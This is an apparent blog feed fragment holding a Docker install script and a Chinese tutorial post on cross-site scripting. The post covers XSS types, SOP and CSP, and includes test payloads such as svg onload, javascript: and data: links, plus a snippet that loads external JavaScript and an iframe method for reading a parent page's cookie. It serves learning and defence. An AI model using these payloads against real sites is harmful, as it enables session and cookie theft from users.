&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y update &amp;amp;&amp;amp; apt -y upgrade&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#添加Docker官方GPG公钥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo add-apt-repository \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu &lt;span class=&quot;variable&quot;&gt;$(lsb_release -cs)&lt;/span&gt; edge&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y install docker-ce&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;curl -L https://github.com/docker/compose/releases/download/1.18.0/docker-compose-`uname -s`-`uname -m` -o /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chmod +x /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql-lab-begin</title>
    <link href="http://blog.recorday.cn/2018/01/26/sql-lab-begin/"/>
    <id>http://blog.recorday.cn/2018/01/26/sql-lab-begin/</id>
    <published>2018-01-26T09:33:33.000Z</published>
    <updated>2018-01-26T09:33:33.923Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS-Explain-2</title>
    <link href="http://blog.recorday.cn/2018/01/26/XSS-Explain-2/"/>
    <id>http://blog.recorday.cn/2018/01/26/XSS-Explain-2/</id>
    <published>2018-01-26T05:22:01.000Z</published>
    <updated>2018-01-26T05:22:01.067Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击探讨总结</title>
    <link href="http://blog.recorday.cn/2018/01/25/XSS-Explain-1/"/>
    <id>http://blog.recorday.cn/2018/01/25/XSS-Explain-1/</id>
    <published>2018-01-25T05:29:22.000Z</published>
    <updated>2018-01-26T06:46:07.652Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS-跨站脚本攻击漏洞-个人整理"><a href="#XSS-跨站脚本攻击漏洞-个人整理" class="headerlink" title="XSS 跨站脚本攻击漏洞 个人整理"></a>XSS 跨站脚本攻击漏洞 个人整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整体篇幅比较长，也算是我自己学习道路上的总结。</span><br><span class="line">大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~</span><br></pre></td></tr></table></figure><h3 id="一-攻击原理："><a href="#一-攻击原理：" class="headerlink" title="一.攻击原理："></a>一.攻击原理：</h3><p>设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等）</p><p>比如网页有一功能：某标签内的value引用一个用户输入的值，然而用户使用 “ 闭合value后面的赋值，接着后面输入onload=”alert(1) 又与value原本的第二个” 相结合，构造出一段额外的弹窗代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"xxx"</span> <span class="attribute">value</span>=<span class="string">" from_user_input "</span>/&gt;</span><br></pre></td></tr></table></figure><p>当 用户输入” onfocus=”alert(1) 时变成了这样：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"xxx"</span> <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">onfocus</span>=<span class="string">"alert(1) "</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>value后面的值被双引号闭合，后面又构造出了一个on事件，从而执行攻击者自定义的操作</p><p>总的来说XSS基本流程是： 攻击者输入-&gt;网页输出-&gt; 受害者打开网页浏览中招</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/25/XSS-Explain-1/xss.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><a id="more"></a><h3 id="二-XSS类型分类："><a href="#二-XSS类型分类：" class="headerlink" title="二.XSS类型分类："></a>二.XSS类型分类：</h3><p>XSS可以大致分为两或三类:</p><h4 id="第一类："><a href="#第一类：" class="headerlink" title="第一类："></a>第一类：</h4><p>如果攻击payload存于url中，受害者需要访问特定携带payload的url才会中招，并且payload并不会入库即不会存储持续触发，则可以称此类型的XSS漏洞为反射型XSS<br>比如网页通过调用当前页面get传入的参数显示到页面中。<br>这类XSS最好防范，危险系数也相对较低，但存在数量较多，挖掘成本低</p><p>大致流程：访问页面进行构造闭合测试，查看源码或者F12使用开发者工具进行修改调试，能弹窗后进行cookie获取测试</p><p>值得一提的是：目前浏览器有自带filter过滤，除火狐浏览器，其他浏览器针对一般的XSS攻击payload已经有了自己的防范机制(放弃加载并警告用户)，为了bypass这一机制，需要进行特殊的编码构造，这又是一门学问。</p><h4 id="第二类："><a href="#第二类：" class="headerlink" title="第二类："></a>第二类：</h4><p>如果攻击payload可以入库，并且长期反应在某一页面中，受害者只要浏览了特定页面就会中招，则称此类型为储存型XSS。<br>这类XSS危害大，挖掘成本较高(需要目标站的提交数据权限)<br>大致流程:<br>通过修改个人资料或提交留言行为进行测试，一般提交一串xss sheet 或者自己觉得好用的payload，当弹框成功后再考虑构造进一步攻击。</p><p>根据构造闭合代码性质不同(html标签or页面JS代码)，还可分为普通XSS和Dom型XSS。</p><p>笔者曾经挖到过CNZZ个人管理页面的DOM储存型XSS，但是属于self-xss，即只有自己能中招的XSS（其他用户访问不到这个页面），如果不能结合CSRF漏洞则比较鸡肋,属于SRC混分行为。</p><h3 id="三-一些经典测试payload："><a href="#三-一些经典测试payload：" class="headerlink" title="三.一些经典测试payload："></a>三.一些经典测试payload：</h3><h5 id="笔者最喜欢用的payload是："><a href="#笔者最喜欢用的payload是：" class="headerlink" title="笔者最喜欢用的payload是："></a>笔者最喜欢用的payload是：</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(1)//</span></span><br></pre></td></tr></table></figure><p>当时拿着这段payload这插插那插插，一天就过去了，玩的不亦乐乎<br>现在想想，这段短小的payload伴随了我测试XSS漏洞的整个时光呢~</p><h5 id="具体引用外部js的代码姿势是"><a href="#具体引用外部js的代码姿势是" class="headerlink" title="具体引用外部js的代码姿势是:"></a>具体引用外部js的代码姿势是:</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>在火狐浏览器下查看的效果(浏览器解析时会自动加上引号):</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/25/XSS-Explain-1/svg.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h5 id="a标签伪协议执行"><a href="#a标签伪协议执行" class="headerlink" title="a标签伪协议执行"></a>a标签伪协议执行</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span> &gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="data引用外域资源"><a href="#data引用外域资源" class="headerlink" title="data引用外域资源"></a>data引用外域资源</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,这里跟着base64之后的js代码"</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外域获取cookie,据我所知只有火狐才可以了，这里涉及同源策略相关知识。</p><p>具体情况还需要具体分析，一定要记住 灵活构造 才是XSS最核心的东西</p><p>以上是黑盒测试我自己的基本流程</p><p>如果平时代码审计呢？</p><p>在PHP下我还真审计出来不少,基本操作还是那些，说一个记忆比较深刻的吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">_SERVER[<span class="string">'PHP_SELF'</span>]</span></span><br></pre></td></tr></table></figure><p>这个PHP超全局变量如果作为输出显示到网页中，会提供当前url，<br>然而不少php环境下开启PATH_INFO，这种功能可以提供路径的形式传参<br>比如Wordpress提供生成静态链接方法，路径是index/article/001，其实这是给index.php传入 article 和 001两个参数，我们可以构造</p><p><code>http://url.cn/index/&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;/xxx/</code></p><p>来作为传入参数，这样显示的url也就包括了这一段payload<br>有趣的是，我在写上面代码的时候，我的markdown编辑器预览界面弹窗了233</p><h3 id="四-谈谈防护："><a href="#四-谈谈防护：" class="headerlink" title="四.谈谈防护："></a>四.谈谈防护：</h3><h5 id="SOP策略（同源策略）"><a href="#SOP策略（同源策略）" class="headerlink" title="SOP策略（同源策略）"></a>SOP策略（同源策略）</h5><p>源是主机，协议，端口名的一个三元组。</p><p>同源策略(Same Origin Policy, SOP)是Web应用程序的一种安全模型，它控制了网页中DOM之间的访问。注意：它仅仅是个模型</p><p>给定一个页面，如果另一个页面使用的协议、端口、主机名都相同，我们则认为两个页面具有相同的源。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">EX:</span> <span class="string">http:</span><span class="comment">//a.url.cn/c0d3r1iu.html</span></span><br></pre></td></tr></table></figure></p><hr><p><a href="http://a.url.cn:80/marvel/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/marvel/c0d3r1iu.html</a> 同源<br><a href="http://a.url.cn:80/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/c0d3r1iu.html</a> 同源<br><a href="http://b.a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">http://b.a.url.cn/c0d3r1iu.html</a> 同源 (二级域相同的三级域名)<br><a href="https://a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://a.url.cn/c0d3r1iu.html</a> 不同源<br><a href="http://a.url.cn:88/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:88/c0d3r1iu.html</a> 不同源<br><a href="https://b.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://b.url.cn/c0d3r1iu.html</a> 不同源</p><hr><p>通过这些例子，大概能了解什么是同源了吧<br>同源策略只允许来自于同源的页面共享一些数据，比如cookie<br>如果没有同源策略，那浏览器就太不安全了，我们会面临访问任意网站都能跨域访问将你的社交网站的cookie共享，这将使得攻击者拿到你的网站管理权限如同探囊取物。</p><p>因此：</p><p>同源策略是由Netscape提出的一个著名的安全策略，现在所有支持JavaScript 的浏览器都会使用这个策略，一些网站认为自己设置了CSP（下一节）script:’self’ 就安全了，他们忘记了document.domain是可以修改的！</p><h5 id="CSP策略-内容安全策略"><a href="#CSP策略-内容安全策略" class="headerlink" title="CSP策略(内容安全策略)"></a>CSP策略(内容安全策略)</h5><p>CSP实际就是一个白名单，它通过设置http头的内容，告诉浏览器可以加载哪些外部资源，比如script，iframe的src可以指定哪些来源</p><h6 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h6><p>default-src 指定了下列所有的资源加载有效来源。</p><h6 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h6><p>定义了页面中Javascript的有效来源</p><h6 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h6><p>定义了页面中CSS样式的有效来源</p><h6 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h6><p>定义了页面中图片和图标的有效来源</p><h6 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h6><p>定义了字体加载的有效来源</p><h6 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h6><p>定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p><h6 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h6><p>指定定义了 web workers 以及嵌套的浏览上下文（如frame和iframe）的源。</p><p>关键字（必须要加单引号）</p><pre><code>&apos;none&apos;代表空集；即不匹配任何 URL。&apos;self&apos; url代表和文档同源（详见上一节），包括相同的 URL 协议和端口号。&apos;unsafe-inline&apos;允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,不怎么安全（除非有设置nonce）&apos;unsafe-eval&apos;允许使用 eval() 等通过字符串创建代码的方法。![](eval.png)&apos;nonce-abc&apos;标签内需要设定和上面相符的nonce值才会执行，google团队提出了一个新的思想，那就是随机化nonce,利用几行后端代码就可以指定nonce之后的值为随机生成的值，使得攻击难度剧增。不过freebuf上有一篇翻译文章指出，这种情况在服务端开启了缓存的情况下还是可以被攻破：[附上链接](http://www.freebuf.com/articles/web/133455.html)</code></pre><p>如果后面空格跟上数据：<br>    data:<br>        允许data: URI作为内容来源。<br>    mediastream:<br>        允许mediastream: URI作为内容来源。</p><p>PS:如果要采用多种关键字，直接空格连接就OK</p><hr><p>做些小实验方便理解一些东西：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'none';script-src 'nonce-abc'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">nonce</span>=<span class="string">"ab"</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">alert(2)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果不加第一行，那么会弹窗1，2<br>但是加了CSP策略，只会弹出2，因为alert(1)所在的script标签nonce不符合策略要求</p><p>接下来通过一个XSS挑战例子说明：</p><p>我们设置如下内容安全策略来限制script加载的地址和iframe加载的地址：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/25/XSS-Explain-1/csp.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当我们试图在iframe将地址设置成 www.baidu.com 的时候，可以看到不会加载成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/25/XSS-Explain-1/csp3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果我们换成符合设定CSP规则的，则可以加载成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/25/XSS-Explain-1/csp2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>此乃内容安全策略，它限制了在当前网页Dom加载资源的来源</p><p>于是我们可以加载主域名相同的其他有XSS漏洞的站点来攻击这个站点</p><p>在嵌入的子页面执行攻击代码，通过top方法，获取父页面的document.cookie</p><h3 id="五-具体攻击实例-amp-参考文献："><a href="#五-具体攻击实例-amp-参考文献：" class="headerlink" title="五.具体攻击实例&amp;参考文献："></a>五.具体攻击实例&amp;参考文献：</h3><p>根据《网络安全法》，笔者不赘述具体攻击详细分析，可以自行去乌云网镜像网站搜索，学习。</p><p>推荐 “心伤的瘦子经典教程”，在这里向他以及消失的乌云致敬！</p><p>CSP策略部分参考链接：</p><p>Sakura2016简书：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p><p>阿里聚安全：<a href="http://jaq.alibaba.com/community/art/show?articleid=518" target="_blank" rel="noopener">http://jaq.alibaba.com/community/art/show?articleid=518</a></p><p>另附一个挑战赛：</p><p><a href="https://knock.xss.moe/index" target="_blank" rel="noopener">XSS千锤百炼挑战赛</a></p><p>学长推荐的，对于新手练习来说也算很不错了，涉及的知识点挺广的。之前忙于其他事情一直也没有把他打穿，然而学长们早都AK了orz，这几天尽量把它做完吧。。。</p><h3 id="六-后记-amp-防御"><a href="#六-后记-amp-防御" class="headerlink" title="六.后记&amp;防御"></a>六.后记&amp;防御</h3><p>XSS攻防好比灵活的舞蹈，需要天马行空的想象，大家加油！</p><p>我准备把相关防御和绕过的探讨放到下一篇，因为这一篇写的东西有点多，atom眼看就要崩溃了QAQ，下次再见 :p</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS-跨站脚本攻击漏洞-个人整理&quot;&gt;&lt;a href=&quot;#XSS-跨站脚本攻击漏洞-个人整理&quot; class=&quot;headerlink&quot; title=&quot;XSS 跨站脚本攻击漏洞 个人整理&quot;&gt;&lt;/a&gt;XSS 跨站脚本攻击漏洞 个人整理&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;整体篇幅比较长，也算是我自己学习道路上的总结。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;一-攻击原理：&quot;&gt;&lt;a href=&quot;#一-攻击原理：&quot; class=&quot;headerlink&quot; title=&quot;一.攻击原理：&quot;&gt;&lt;/a&gt;一.攻击原理：&lt;/h3&gt;&lt;p&gt;设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等）&lt;/p&gt;
&lt;p&gt;比如网页有一功能：某标签内的value引用一个用户输入的值，然而用户使用 “ 闭合value后面的赋值，接着后面输入onload=”alert(1) 又与value原本的第二个” 相结合，构造出一段额外的弹窗代码&lt;/p&gt;
&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;input &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xxx&quot;&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot; from_user_input &quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当 用户输入” onfocus=”alert(1) 时变成了这样：&lt;br&gt;&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;input &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xxx&quot;&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;onfocus&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;alert(1) &quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;value后面的值被双引号闭合，后面又构造出了一个on事件，从而执行攻击者自定义的操作&lt;/p&gt;
&lt;p&gt;总的来说XSS基本流程是： 攻击者输入-&amp;gt;网页输出-&amp;gt; 受害者打开网页浏览中招&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;/2018/01/25/XSS-Explain-1/xss.png&quot; alt=&quot;&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;&lt;/div&gt;
            &lt;/figure&gt;
    
    </summary>
    
    
      <category term="XSS 跨站脚本攻击" scheme="http://blog.recorday.cn/tags/XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
</feed>
